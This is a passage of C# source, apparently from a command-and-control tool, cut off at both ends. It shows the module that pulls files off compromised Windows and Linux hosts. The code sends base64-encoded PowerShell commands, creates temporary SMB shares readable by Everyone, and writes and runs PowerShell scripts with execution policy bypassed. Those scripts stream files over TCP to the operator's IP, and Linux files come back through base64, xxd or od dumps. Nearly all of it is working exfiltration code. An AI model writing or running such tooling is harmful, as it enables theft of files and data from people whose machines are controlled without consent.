                activeClient.EnableBase64Capture(true, false);

                try
                {
                    // Create and execute a PowerShell command to read and Base64 encode the file
                    string encodedCommand = Convert.ToBase64String(
        Encoding.Unicode.GetBytes($@"
        $ErrorActionPreference = 'Stop'
        $ProgressPreference = 'SilentlyContinue'
        $filePath = '{remotePath.Replace("'", "''")}'
        
        if (Test-Path -Path $filePath -PathType Leaf) {{
            $fileSize = (Get-Item $filePath).Length
            Write-Output ""FILE_SIZE:$fileSize""
            
            # FIX: Use streaming for large files to avoid memory limits
            Write-Output ""BEGIN_BASE64_DATA""
            
            if ($fileSize -gt 5MB) {{
                # Stream large files in chunks
                $stream = [System.IO.File]::OpenRead($filePath)
                $buffer = New-Object byte[] 1048576
                try {{
                    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {{
                        if ($bytesRead -lt $buffer.Length) {{
                            $finalBuffer = New-Object byte[] $bytesRead
                            [Array]::Copy($buffer, $finalBuffer, $bytesRead)
                            [Convert]::ToBase64String($finalBuffer)
                        }} else {{
                            [Convert]::ToBase64String($buffer)
                        }}
                    }}
                }} finally {{
                    $stream.Close()
                }}
            }} else {{
                # Small files - use original method
                [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePath))
            }}
            
            Write-Output ""END_BASE64_DATA""
        }} else {{
            Write-Output ""FILE_NOT_FOUND""
        }}
    "));

                    const int maxWaitTimeMs = 600000; // 10 minutes
                    const int checkIntervalMs = 500;

                    activeClient.SendCommand($"powershell -EncodedCommand {encodedCommand}");

                    // Wait for the file to be transferred
                    int elapsedMs = 0;
                    bool transferComplete = false;
                    string base64Data = null;

                    while (elapsedMs < maxWaitTimeMs && !transferComplete)
                    {
                        await Task.Delay(checkIntervalMs);
                        elapsedMs += checkIntervalMs;

                        // Get the response that might contain our data markers
                        string response = activeClient.GetLastResponse();

                        if (response != null && response.Contains("END_BASE64_DATA"))
                        {
                            transferComplete = true;

                            // Get the captured Base64 content
                            base64Data = activeClient.GetCapturedBase64();

                            if (string.IsNullOrEmpty(base64Data))
                            {
                                // Try to extract Base64 directly from the response
                                int startMarker = response.IndexOf("BEGIN_BASE64_DATA");
                                int endMarker = response.IndexOf("END_BASE64_DATA");

                                if (startMarker >= 0 && endMarker > startMarker)
                                {
                                    // Extract the content between markers
                                    int contentStart = response.IndexOf('\n', startMarker);
                                    if (contentStart >= 0)
                                    {
                                        contentStart += 1; // Skip the newline

                                        // Extract the Base64 part
                                        base64Data = response.Substring(contentStart, endMarker - contentStart).Trim();
                                    }
                                }
                            }

                            break;
                        }

                        // Show progress less frequently to avoid rate limiting
                        if (elapsedMs % 10000 == 0) // Every 10 seconds instead of more frequent updates
                        {
                            RaiseOutputMessage($"[*] Download in progress... ({elapsedMs / 1000}s elapsed)", Color.Cyan);
                        }
                    }

                    if (!transferComplete || string.IsNullOrEmpty(base64Data))
                    {
                        RaiseOutputMessage($"[!] Failed to download file - timeout or corrupted data", Color.Red);
                        return false;
                    }

                    await Task.Delay(500);

                    // Convert the Base64 content back to binary and save the file
                    try
                    {
                        byte[] fileBytes = Convert.FromBase64String(base64Data);

                        // Save the file
                        string fileName = Path.GetFileName(remotePath);
                        string sanitizedFileName = string.Join("_", fileName.Split(Path.GetInvalidFileNameChars()));

                        string saveDir = downloadPath ?? GetC2DownloadDirectory();
                        try
                        {
                            if (!Directory.Exists(saveDir))
                            {
                                Directory.CreateDirectory(saveDir);
                            }

                            string finalPath = Path.Combine(saveDir, sanitizedFileName);

                            await Task.Delay(200);

                            File.WriteAllBytes(finalPath, fileBytes);

                            TimeSpan downloadTime = DateTime.Now - _downloadStartTime;
                            string timeString = downloadTime.TotalSeconds < 60
                                ? $"{downloadTime.TotalSeconds:F1} seconds"
                                : $"{downloadTime.Minutes}m {downloadTime.Seconds}s";

                            RaiseOutputMessage($"[+] File downloaded successfully: {finalPath}", Color.Green);
                            RaiseOutputMessage($"[+] Size: {FormatFileSize(fileBytes.Length)}, Time: {timeString}", Color.Green);
                            OpenFolder(Path.GetDirectoryName(finalPath));

                        }
                        catch (Exception ex)
                        {
                            RaiseOutputMessage($"[!] Error saving file to {saveDir}: {ex.Message}", Color.Red);

                            // Fallback to temp directory
                            string tempDir = Path.GetTempPath();
                            string finalPath = Path.Combine(tempDir, sanitizedFileName);
                            File.WriteAllBytes(finalPath, fileBytes);

                            RaiseOutputMessage($"[+] File downloaded to fallback location: {finalPath}", Color.Green);
                        }

                        return true;
                    }
                    catch (FormatException fex)
                    {
                        RaiseOutputMessage($"[!] Error decoding Base64 data: {fex.Message}", Color.Red);
                        return false;
                    }
                }
                finally
                {
                    // Ensure base64 capture is disabled
                    activeClient.EnableBase64Capture(false);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in direct download: {ex.Message}", Color.Red);
                return false;
            }
        }

        public async Task DownloadFileViaSMB(ClientHandler activeClient, string remotePath, string downloadPath = null)
        {
            try
            {
                // First, check if the file exists
                activeClient.SendCommand($"if exist \"{remotePath}\" (echo FILE_EXISTS) else (echo FILE_NOT_FOUND)");
                await Task.Delay(1000);

                string verification = activeClient.GetLastResponse();
                if (verification.Contains("FILE_NOT_FOUND"))
                {
                    RaiseOutputMessage($"[!] Remote file not found: {remotePath}", Color.Red);
                    return;
                }

                string fileName = Path.GetFileName(remotePath);
                string sanitizedFileName = string.Join("_", fileName.Split(Path.GetInvalidFileNameChars()));

                // Ensure the download directory exists
                string downloadDir = downloadPath ?? GetC2DownloadDirectory();

                if (!Directory.Exists(downloadDir))
                {
                    Directory.CreateDirectory(downloadDir);
                }

                string finalPath = DetermineOutputPath(downloadPath, sanitizedFileName);
                RaiseOutputMessage($"[*] Initiating SMB download of {remotePath}", Color.Yellow);

                // Generate a random share name
                string shareName = $"C2Share_{Guid.NewGuid().ToString().Substring(0, 8)}";
                string shareFolder = Path.GetDirectoryName(remotePath);

                RaiseOutputMessage($"[*] Creating temporary SMB share '{shareName}'", Color.Yellow);

                // Create a temporary SMB share of the directory containing the file
                activeClient.SendCommand($"net share {shareName}=\"{shareFolder}\" /GRANT:Everyone,READ");
                await Task.Delay(2000);

                // Check if share creation was successful
                activeClient.SendCommand($"net share | findstr {shareName}");
                await Task.Delay(1000);

                string shareVerification = activeClient.GetLastResponse();
                if (!shareVerification.Contains(shareName))
                {
                    RaiseOutputMessage($"[!] Failed to create SMB share. Falling back to direct download.", Color.Red);
                    await DownloadFileWithBase64(activeClient, remotePath, downloadPath);
                    return;
                }

                // Get client IP address
                string clientIp = activeClient.ClientInfo.Split(':')[0];

                // Calculate UNC path to the file in the share
                string remoteFilename = Path.GetFileName(remotePath);
                string uncPath = $"\\\\{clientIp}\\{shareName}\\{remoteFilename}";

                RaiseOutputMessage($"[*] Downloading from {uncPath}", Color.Yellow);

                // Start a stopwatch to measure the download time
                Stopwatch stopwatch = Stopwatch.StartNew();
                long fileSize = 0;

                try
                {
                    // Get file info for progress tracking
                    if (File.Exists(uncPath))
                    {
                        fileSize = new FileInfo(uncPath).Length;
                    }

                    // Copy file with progress reporting
                    await CopyFileWithProgress(uncPath, finalPath, fileSize);

                    stopwatch.Stop();
                    RaiseOutputMessage($"[+] Download completed: {finalPath} ({FormatFileSize(new FileInfo(finalPath).Length)}) in {FormatTimeSpan(stopwatch.Elapsed.TotalSeconds)}", Color.Green);
                    OpenFolder(Path.GetDirectoryName(finalPath));
                }
                catch (Exception ex)
                {
                    RaiseOutputMessage($"[!] Error accessing shared file: {ex.Message}", Color.Red);
                    RaiseOutputMessage("[!] Falling back to direct download method", Color.Yellow);
                    await DownloadFileWithBase64(activeClient, remotePath, downloadPath);
                }
                finally
                {
                    // Remove the temporary share
                    RaiseOutputMessage($"[*] Removing temporary SMB share", Color.Yellow);
                    activeClient.SendCommand($"net share {shareName} /delete /y");
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in SMB download: {ex.Message}", Color.Red);
                RaiseOutputMessage("[!] Falling back to direct download method", Color.Yellow);
                await DownloadFileWithBase64(activeClient, remotePath, downloadPath);
            }
        }

        private async Task DownloadFileLinux(ClientHandler activeClient, string remotePath, string downloadPath = null)
        {
            try
            {
                RaiseOutputMessage($"[*] Downloading file from Linux system: {remotePath}", Color.Yellow);

                // First check if file exists using 'test' command
                activeClient.SendCommand($"test -f \"{remotePath}\" && echo 'FILE_EXISTS' || echo 'FILE_NOT_FOUND'");
                await Task.Delay(1500);

                string verification = activeClient.GetLastResponse();
                if (verification.Contains("FILE_NOT_FOUND"))
                {
                    RaiseOutputMessage($"[!] Remote file not found: {remotePath}", Color.Red);
                    return;
                }

                // Get file size using stat command
                activeClient.SendCommand($"stat -c%s \"{remotePath}\" 2>/dev/null || echo 'SIZE_ERROR'");
                await Task.Delay(1000);

                string sizeResponse = activeClient.GetLastResponse();
                long fileSize = 0;

                if (!sizeResponse.Contains("SIZE_ERROR"))
                {
                    var lines = sizeResponse.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (var line in lines)
                    {
                        if (long.TryParse(line.Trim(), out fileSize))
                        {
                            _expectedFileSize = fileSize;
                            break;
                        }
                    }
                }

                _downloadStartTime = DateTime.Now;

                // Use different methods based on available tools
                bool hasBase64 = await CheckLinuxCommand(activeClient, "base64");
                bool hasXxd = await CheckLinuxCommand(activeClient, "xxd");
                bool hasOd = await CheckLinuxCommand(activeClient, "od");

                if (hasBase64)
                {
                    await DownloadFileLinuxBase64(activeClient, remotePath, downloadPath);
                }
                else if (hasXxd)
                {
                    await DownloadFileLinuxHex(activeClient, remotePath, downloadPath, "xxd");
                }
                else if (hasOd)
                {
                    await DownloadFileLinuxHex(activeClient, remotePath, downloadPath, "od");
                }
                else
                {
                    // Fallback to cat with special handling
                    await DownloadFileLinuxCat(activeClient, remotePath, downloadPath);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in Linux download: {ex.Message}", Color.Red);
            }
        }

        #endregion

        #region Helper Methods

        private string GetLocalIPAddress(ClientHandler activeClient)
        {
            try
            {
                // Try to determine who the client is connecting to
                if (activeClient != null)
                {
                    string ipPort = activeClient.ClientInfo;
                    if (!string.IsNullOrEmpty(ipPort))
                    {
                        // Use localhost if we're connected to a local IP
                        string clientIP = ipPort.Split(':')[0];
                        if (clientIP.StartsWith("127.") || clientIP.StartsWith("192.168.") || clientIP.StartsWith("10."))
                        {
                            // Get our matching local interface
                            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                            {
                                socket.Connect(clientIP, 65530);
                                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                                return endPoint.Address.ToString();
                            }
                        }
                    }
                }

                // Fallback to getting the primary IP address
                IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (IPAddress ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
                return "127.0.0.1"; // Last resort fallback
            }
            catch
            {
                // If all else fails, just use loopback
                return "127.0.0.1";
            }
        }

        public string GetC2DownloadDirectory()
        {
            string[] possibleDirs = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "C2Downloads"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "C2Downloads"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "C2Downloads"),
                Path.Combine(Path.GetTempPath(), "C2Downloads") // Most reliable fallback
            };

            // Try each directory in order
            foreach (string dir in possibleDirs)
            {
                try
                {
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }

                    // Test write access
                    string testFile = Path.Combine(dir, "test_write.tmp");
                    File.WriteAllText(testFile, "test");
                    File.Delete(testFile);

                    // This directory works
                    return dir;
                }
                catch
                {
                    // This directory didn't work, try the next one
                    continue;
                }
            }

            // If all directories fail, use a unique directory in temp
            string tempDir = Path.Combine(Path.GetTempPath(), $"C2Downloads_{DateTime.Now:yyyyMMdd}");

            try
            {
                if (!Directory.Exists(tempDir))
                {
                    Directory.CreateDirectory(tempDir);
                }
                return tempDir;
            }
            catch
            {
                // Last resort - just use the temp directory itself
                return Path.GetTempPath();
            }
        }

        private string FormatFileSize(long bytes)
        {
            if (bytes < 1024)
                return $"{bytes} B";
            else if (bytes < 1024 * 1024)
                return $"{bytes / 1024.0:F1} KB";
            else if (bytes < 1024 * 1024 * 1024)
                return $"{bytes / (1024.0 * 1024.0):F1} MB";
            else
                return $"{bytes / (1024.0 * 1024.0 * 1024.0):F1} GB";
        }

        private string FormatBytesPerSecond(double bytesPerSecond)
        {
            string[] sizes = { "B/s", "KB/s", "MB/s", "GB/s" };
            int order = 0;
            double speed = bytesPerSecond;

            while (speed >= 1024 && order < sizes.Length - 1)
            {
                order++;
                speed = speed / 1024;
            }

            return $"{speed:0.##} {sizes[order]}";
        }

        private string FormatTimeSpan(double totalSeconds)
        {
            if (double.IsInfinity(totalSeconds) || totalSeconds <= 0)
                return "calculating...";

            TimeSpan timeSpan = TimeSpan.FromSeconds(totalSeconds);

            if (timeSpan.TotalHours >= 1)
                return $"{timeSpan.Hours}h {timeSpan.Minutes}m";
            else if (timeSpan.TotalMinutes >= 1)
                return $"{timeSpan.Minutes}m {timeSpan.Seconds}s";
            else
                return $"{timeSpan.Seconds}s";
        }

        private void OpenFolder(string folderPath)
        {
            try
            {
                if (Directory.Exists(folderPath))
                {
                    Process.Start("explorer.exe", folderPath);
                    RaiseOutputMessage($"[*] Opening folder: {folderPath}", Color.Cyan);
                }
                else
                {
                    RaiseOutputMessage($"[!] Folder doesn't exist: {folderPath}", Color.Red);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error opening folder: {ex.Message}", Color.Red);
            }
        }

        private void RaiseOutputMessage(string message, Color color)
        {
            OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));
        }


        private async Task<bool> VerifyFileExistsWithShellDetection(ClientHandler activeClient, string remotePath)
        {
            try
            {
                string shellType = await DetectShellType(activeClient);

                string verificationCommand;

                if (shellType.Equals("powershell", StringComparison.OrdinalIgnoreCase))
                {
                    // PowerShell syntax
                    verificationCommand = $"if (Test-Path \"{remotePath}\") {{ Write-Output 'FILE_EXISTS' }} else {{ Write-Output 'FILE_NOT_FOUND' }}";
                }
                else
                {
                    // CMD syntax
                    verificationCommand = $"if exist \"{remotePath}\" (echo FILE_EXISTS) else (echo FILE_NOT_FOUND)";
                }

                activeClient.SendCommand(verificationCommand);
                await Task.Delay(1500);

                string verification = activeClient.GetLastResponse();
                return verification != null && verification.Contains("FILE_EXISTS");
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error verifying file: {ex.Message}", Color.Red);
                return false;
            }
        }

        private async Task<string> DetectShellType(ClientHandler activeClient)
        {
            try
            {
                activeClient.SendCommand("echo $PSVersionTable 2>nul");
                await Task.Delay(800);

                string response = activeClient.GetLastResponse();

                if (response != null && !response.Contains("$PSVersionTable") &&
                    (response.Contains("PSVersion") || response.Contains("Version") || response.Contains(".")))
                {
                    RaiseOutputMessage("[*] PowerShell detected via version check", Color.Cyan);
                    return "powershell";
                }

                activeClient.SendCommand("echo %COMSPEC% 2>nul");
                await Task.Delay(800);

                response = activeClient.GetLastResponse();


                if (response != null && response.Contains("cmd.exe"))
                {
                    return "cmd";
                }

                activeClient.SendCommand("echo $env:COMPUTERNAME 2>$null");
                await Task.Delay(800);

                response = activeClient.GetLastResponse();


                if (response != null && !response.Contains("$env:COMPUTERNAME") &&
                    response.Length > 5 && !response.Contains("not recognized"))
                {
                    return "powershell";
                }

                // Fallback based on connection type
                RaiseOutputMessage("[*] Using connection type heuristics for shell detection", Color.Yellow);
                return !activeClient.IsEncrypted ? "powershell" : "cmd";
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error in clean shell detection: {ex.Message}", Color.Yellow);
                return !activeClient.IsEncrypted ? "powershell" : "cmd";
            }
        }

        private async Task CreateDownloadScriptForDetectedShell(ClientHandler activeClient, string remotePath, string localIP, int port)
        {
            try
            {
                string shellType = await DetectShellType(activeClient);

                if (shellType.Equals("powershell", StringComparison.OrdinalIgnoreCase))
                {
                    await CreatePowerShellDownloadScript(activeClient, remotePath, localIP, port);
                }
                else
                {
                    await CreateCMDDownloadScript(activeClient, remotePath, localIP, port);
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error creating download script: {ex.Message}", Color.Red);
                throw;
            }
        }

        private async Task CreatePowerShellDownloadScript(ClientHandler activeClient, string remotePath, string localIP, int port)
        {
            try
            {

                string psScript = $@"
try {{
    $ErrorActionPreference = 'Stop'
    $ProgressPreference = 'SilentlyContinue'
    $filePath = '{remotePath.Replace("'", "''")}'
    
    if (!(Test-Path $filePath)) {{ throw 'File not found' }}
    
    $fileSize = (Get-Item $filePath).Length
    Write-Output ""[*] File size: $fileSize bytes""
    
    $client = New-Object System.Net.Sockets.TcpClient
    $client.SendBufferSize = 65536
    
    $connectResult = $client.BeginConnect('{localIP}', {port}, $null, $null)
    $connectSuccess = $connectResult.AsyncWaitHandle.WaitOne(10000, $false)
    
    if (!$connectSuccess) {{ throw 'Connection timed out' }}
    $client.EndConnect($connectResult)
    
    
    $stream = $client.GetStream()
    
    $sizeBytes = [BitConverter]::GetBytes([long]$fileSize)
    $stream.Write($sizeBytes, 0, 8)
    $stream.Flush()
    
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $buffer = New-Object byte[] 65536
    $totalBytesSent = 0
    
    while ($totalBytesSent -lt $fileSize) {{
        $bytesToRead = [Math]::Min($buffer.Length, $fileSize - $totalBytesSent)
        $bytesRead = $fileStream.Read($buffer, 0, $bytesToRead)
        
        if ($bytesRead -le 0) {{ break }}
        
        $stream.Write($buffer, 0, $bytesRead)
        $stream.Flush()
        
        $totalBytesSent += $bytesRead
    }}
    
    $fileStream.Close()
    $stream.Close()
    $client.Close()
    
}} catch {{
    Write-Output ""[!] DOWNLOAD_ERROR: $($_.Exception.Message)""
}}
";

                // Encode the script in base64 to avoid quote and escaping issues
                byte[] bytes = Encoding.Unicode.GetBytes(psScript);
                string encodedScript = Convert.ToBase64String(bytes);

                // Execute the encoded PowerShell script
                activeClient.SendCommand($"powershell -EncodedCommand {encodedScript}");
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error creating PowerShell script: {ex.Message}", Color.Red);
                throw;
            }
        }

        private async Task CreateCMDDownloadScript(ClientHandler activeClient, string remotePath, string localIP, int port)
        {
            try
            {

                string tempScriptPath = $"%TEMP%\\dl_{DateTime.Now:HHmmss}.ps1";

                activeClient.SendCommand($"echo # Download script > {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo $ErrorActionPreference = 'Stop' >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo $ProgressPreference = 'SilentlyContinue' >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo try {{ >> {tempScriptPath}");
                await Task.Delay(100);


                activeClient.SendCommand($"echo   $filePath = '{remotePath.Replace("'", "''")}' >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   if (-not (Test-Path $filePath)) {{ throw 'File not found' }} >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $fileSize = (Get-Item $filePath).Length >> {tempScriptPath}");
                await Task.Delay(100);

                await Task.Delay(100);

                activeClient.SendCommand($"echo   $client = New-Object System.Net.Sockets.TcpClient >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $client.SendBufferSize = 65536 >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $connectResult = $client.BeginConnect('{localIP}', {port}, $null, $null) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $connectSuccess = $connectResult.AsyncWaitHandle.WaitOne(10000, $false) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   if (-not $connectSuccess) {{ throw 'Connection timed out' }} >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $client.EndConnect($connectResult) >> {tempScriptPath}");
                await Task.Delay(100);


                activeClient.SendCommand($"echo   $stream = $client.GetStream() >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $sizeBytes = [BitConverter]::GetBytes([long]$fileSize) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $stream.Write($sizeBytes, 0, 8) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $stream.Flush() >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $fileStream = [System.IO.File]::OpenRead($filePath) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $buffer = New-Object byte[] 65536 >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $totalBytesSent = 0 >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   while ($totalBytesSent -lt $fileSize) {{ >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo     $bytesToRead = [Math]::Min($buffer.Length, $fileSize - $totalBytesSent) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo     $bytesRead = $fileStream.Read($buffer, 0, $bytesToRead) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo     if ($bytesRead -le 0) {{ break }} >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo     $stream.Write($buffer, 0, $bytesRead) >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo     $stream.Flush() >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo     $totalBytesSent += $bytesRead >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   }} >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $fileStream.Close() >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $stream.Close() >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   $client.Close() >> {tempScriptPath}");
                await Task.Delay(100);



                activeClient.SendCommand($"echo }} catch {{ >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo   Write-Output \"[!] DOWNLOAD_ERROR: $($_.Exception.Message)\" >> {tempScriptPath}");
                await Task.Delay(100);

                activeClient.SendCommand($"echo }} >> {tempScriptPath}");
                await Task.Delay(100);

                // Execute the PowerShell script we just created
                activeClient.SendCommand($"powershell -ExecutionPolicy Bypass -File {tempScriptPath}");
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error creating CMD script: {ex.Message}", Color.Red);
                throw;
            }
        }

        private async Task CopyFileWithProgress(string sourceFile, string destFile, long fileSize)
        {
            const int bufferSize = 1024 * 1024; // 1 MB buffer
            byte[] buffer = new byte[bufferSize];
            long totalBytesRead = 0;

            DateTime startTime = DateTime.Now;
            DateTime lastUpdateTime = DateTime.Now;

            using (FileStream source = new FileStream(sourceFile, FileMode.Open, FileAccess.Read))
            using (FileStream dest = new FileStream(destFile, FileMode.Create, FileAccess.Write))
            {
                int bytesRead;
                while ((bytesRead = await source.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {
                    await dest.WriteAsync(buffer, 0, bytesRead);
                    totalBytesRead += bytesRead;

                    // Update progress approximately once per second
                    TimeSpan elapsed = DateTime.Now - lastUpdateTime;
                    if (elapsed.TotalSeconds >= 1 || totalBytesRead == fileSize)
                    {
                        // Calculate percentage
                        int percentage = fileSize > 0 ? (int)((double)totalBytesRead / fileSize * 100) : 0;

                        // Calculate speed
                        double bytesPerSecond = totalBytesRead / (DateTime.Now - startTime).TotalSeconds;
                        string speed = FormatBytesPerSecond(bytesPerSecond);

                        // Calculate ETA
                        string eta = "Unknown";
                        if (bytesPerSecond > 0 && fileSize > 0)
                        {
                            double secondsRemaining = (fileSize - totalBytesRead) / bytesPerSecond;
                            eta = FormatTimeSpan(secondsRemaining);
                        }

                        // Create a progress bar
                        int barWidth = 30;
                        int filled = (int)((float)totalBytesRead / fileSize * barWidth);
                        string progressBar = "[" + new string('█', filled) + new string('░', barWidth - filled) + "]";

                        // Display progress
                        RaiseOutputMessage($"[*] Downloading: {progressBar} {percentage}% ({FormatFileSize(totalBytesRead)}/{FormatFileSize(fileSize)}) {speed}, ETA: {eta}", Color.Cyan);

                        lastUpdateTime = DateTime.Now;
                    }
                }
            }
        }

        private string DetermineOutputPath(string downloadPath, string sanitizedFileName)
        {
            // First, try the specified download path if provided
            if (!string.IsNullOrEmpty(downloadPath))
            {
                try
                {
                    // Ensure directory exists
                    if (!Directory.Exists(downloadPath))
                    {
                        Directory.CreateDirectory(downloadPath);
                    }

                    // Test write access
                    string testFile = Path.Combine(downloadPath, "test_write.tmp");
                    File.WriteAllText(testFile, "test");
                    File.Delete(testFile);

                    // Path is valid and writable
                    return Path.Combine(downloadPath, sanitizedFileName);
                }
                catch (Exception ex)
                {
                    RaiseOutputMessage($"[!] Error with specified download path: {ex.Message}", Color.Yellow);
                    RaiseOutputMessage("[*] Using temporary location instead", Color.Yellow);
                }
            }

            // If no path specified or permission issues, use the system temp directory
            string tempDir = Path.Combine(Path.GetTempPath(), "C2Downloads");
            try
            {
                if (!Directory.Exists(tempDir))
                {
                    Directory.CreateDirectory(tempDir);
                }

                // Verify write permissions
                string testFile = Path.Combine(tempDir, "test_write.tmp");
                File.WriteAllText(testFile, "test");
                File.Delete(testFile);

                string finalPath = Path.Combine(tempDir, sanitizedFileName);
                RaiseOutputMessage($"[*] Using download location: {finalPath}", Color.Yellow);
                return finalPath;
            }
            catch
            {
                // If even the temp directory fails, use a unique file directly in temp
                string tempFile = Path.Combine(
                    Path.GetTempPath(),
                    $"c2dl_{DateTime.Now:yyyyMMddHHmmss}_{sanitizedFileName}"
                );

                RaiseOutputMessage($"[*] Using fallback location: {tempFile}", Color.Yellow);
                return tempFile;
            }
        }

        // Linux-specific download methods
        private async Task DownloadFileLinuxBase64(ClientHandler activeClient, string remotePath, string downloadPath)
        {
            try
            {
                RaiseOutputMessage("[*] Using base64 encoding for download...", Color.Yellow);

                // Enable base64 capture
                activeClient.EnableBase64Capture(true, false);

                // Create the base64 command with markers
                string command = $"echo 'BEGIN_BASE64_DATA' && base64 \"{remotePath}\" && echo 'END_BASE64_DATA'";
                activeClient.SendCommand(command);

                // Wait for transfer completion
                const int maxWaitTimeMs = 300000; // 5 minutes
                int elapsedMs = 0;
                const int checkIntervalMs = 500;
                bool transferComplete = false;

                while (elapsedMs < maxWaitTimeMs && !transferComplete)
                {
                    await Task.Delay(checkIntervalMs);
                    elapsedMs += checkIntervalMs;

                    string response = activeClient.GetLastResponse();
                    if (response != null && response.Contains("END_BASE64_DATA"))
                    {
                        transferComplete = true;
                        break;
                    }

                    // Show progress every 5 seconds
                    if (elapsedMs % 5000 == 0)
                    {
                        RaiseOutputMessage($"[*] Transfer in progress... ({elapsedMs / 1000}s elapsed)", Color.Cyan);
                    }
                }

                if (!transferComplete)
                {
                    RaiseOutputMessage("[!] Transfer timeout", Color.Red);
                    return;
                }

                // Get the captured base64 data
                string base64Data = activeClient.GetCapturedBase64();

                if (string.IsNullOrEmpty(base64Data))
                {
                    RaiseOutputMessage("[!] No base64 data captured", Color.Red);
                    return;
                }

                // Decode and save the file
                await SaveDecodedFileLinux(base64Data, remotePath, downloadPath);
            }
            finally
            {
                activeClient.EnableBase64Capture(false);
            }
        }

        private async Task DownloadFileLinuxHex(ClientHandler activeClient, string remotePath, string downloadPath, string hexTool)
        {
            try
            {
                RaiseOutputMessage($"[*] Using {hexTool} for hex encoding download...", Color.Yellow);

                string command;
                if (hexTool == "xxd")
                {
                    command = $"echo 'BEGIN_HEX_DATA' && xxd -p \"{remotePath}\" | tr -d '\\n' && echo && echo 'END_HEX_DATA'";
                }
                else // od
                {
                    command = $"echo 'BEGIN_HEX_DATA' && od -An -tx1 \"{remotePath}\" | tr -d ' \\n' && echo && echo 'END_HEX_DATA'";
                }

                activeClient.SendCommand(command);

                // Wait for completion
                const int maxWaitTimeMs = 300000;
                int elapsedMs = 0;
                const int checkIntervalMs = 500;
                bool transferComplete = false;
                StringBuilder hexData = new StringBuilder();

                while (elapsedMs < maxWaitTimeMs && !transferComplete)
                {
                    await Task.Delay(checkIntervalMs);
                    elapsedMs += checkIntervalMs;

                    string response = activeClient.GetLastResponse();
                    if (response != null)
                    {
                        if (response.Contains("END_HEX_DATA"))
                        {
                            transferComplete = true;
                        }
                        hexData.Append(response);
                    }

                    if (elapsedMs % 5000 == 0)
                    {
                        RaiseOutputMessage($"[*] Transfer in progress... ({elapsedMs / 1000}s elapsed)", Color.Cyan);
                    }
                }

                if (!transferComplete)
                {
                    RaiseOutputMessage("[!] Transfer timeout", Color.Red);
                    return;
                }

                // Extract hex data between markers
                string fullResponse = hexData.ToString();
                int startIndex = fullResponse.IndexOf("BEGIN_HEX_DATA");
                int endIndex = fullResponse.IndexOf("END_HEX_DATA");

                if (startIndex >= 0 && endIndex > startIndex)
                {
                    string hexContent = fullResponse.Substring(startIndex + "BEGIN_HEX_DATA".Length, endIndex - startIndex - "BEGIN_HEX_DATA".Length);

                    // Clean the hex data
                    hexContent = System.Text.RegularExpressions.Regex.Replace(hexContent, @"[^0-9a-fA-F]", "");

                    // Convert hex to bytes
                    byte[] fileBytes = HexStringToBytes(hexContent);

                    if (fileBytes != null && fileBytes.Length > 0)
                    {
                        await SaveBinaryFileLinux(fileBytes, remotePath, downloadPath);
                    }
                    else
                    {
